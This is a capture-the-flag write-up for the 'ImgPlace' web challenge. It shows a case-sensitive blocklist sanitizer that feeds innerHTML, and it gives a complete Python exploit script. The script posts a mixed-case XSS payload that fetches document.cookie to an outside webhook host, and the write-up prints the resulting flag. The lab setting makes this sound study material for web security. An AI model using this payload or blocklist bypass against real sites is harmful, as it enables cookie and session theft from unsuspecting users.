+++
title = 'ImgPlace'
tags = [
  "Web",
  "Python",
  "XSS",
  "232 points",
  "13 solves",
  "dadadani",
]
date = 2024-12-23T16:48:55+01:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>ImgPlace</h1>

**Description**: Are you a photographer but have no reputation? Join ImgPlace! Share your photos... and become popular!

## Introduction

We have a very simple application where we are allowed to register and log in and then we can upload images via url and associated description

## Source

The source is only parsable by devtools from the browser, and we can see that in the pic.js file we have a function that sanitizes the image description

```javascript
# filename: pic.js

"use strict";

(async () => {
    const picPhoto = document.getElementById("picPhoto");
    const picDesc = document.getElementById("picDesc");

    const r = await fetch("/api/pic/" + window.picId);

    if (r.ok) {
        const data = await r.json();
        picPhoto.src = data.src;

        // We need to block dangerous things!
        const blocklist = [
            "<comment",
            "<embed",
            "<link",
            "<listing",
            "<meta",
            "<noscript",
            "<object",
            "<plaintext",
            "<script",
            "<xmp",
            "<style",
            "<applet",
            "<iframe",
            "<img",
            "onload",
            "onblur",
            "onclick",
            "onerror",
            "href",
            "javascript",
            "window",
            "src",
        ];
        let description = String(data.description);
        blocklist.forEach((word) => {
            description = description.replace(word, "");
        });

        picDesc.innerHTML = description;
    } else {
        if (r.status == 401) {
            window.location.href = "/profile";
        } else {
            alert("Unable to load photo!");
        }
    }
})();
```
We can see this trivially from the code that takes ById elements are taken and the word is deleted.

## Solution

There are really several solutions I used the simplest one which is to take advantage of the fact that the replace is case sensitive and no lowercase is done in the code to my description

```python
# filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests
from bs4 import BeautifulSoup

BASE_URL = "https://imgplace.challs.m0lecon.it"
URL_HOOK = "https://webhook.site/6a1df142-d272-4e11-8937-dbd81a33e9d2"

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

s = requests.Session()

def register(username, password):
    r = s.post(f"{BASE_URL}/register", data={"username": username, "password": password,"confirmPassword":password})

    if r.status_code != 200:
        print("[+] Error register")
        print(r.text)
        exit(1)
    else:
        print("[+] Register success")

def login(username, password):
    r = s.post(f"{BASE_URL}", data={"username": username, "password": password})
    if r.status_code != 200:
        print("[+] Error login")
        print(r.text)
        exit(1)
    else:
        print("[+] Login success")

def new(payload):
    r = s.post(f"{BASE_URL}/new", data={"url": URL_HOOK, "description": payload})
    if r.status_code != 200:
        print("[+] Error new image")
        print(r.text)
        exit(1)
    else:
        print("[+] New Image Success")


def main():
    username,password = string_generator(10),string_generator(10)
    print(f"Username: {username} Password : {password}")
    register(username,password)
    login(username,password)
    payload = "<ImG SrC=x OnError=fetch(`"+URL_HOOK+"?q=${document.cookie}`)>"
    new(payload=payload)
    print("[+] Done")
    print("[+] Now login to the website go to the image complete the captcha and you will get the flag on the webhook")


if __name__ == "__main__":
	main()

# goodluck by @akiidjk
```

```stdout
$ flag: ptm{n3v3r_tRvST_t3g_bL0ckL1sts}
```
<p align='right'>Author: akiidjk </p>
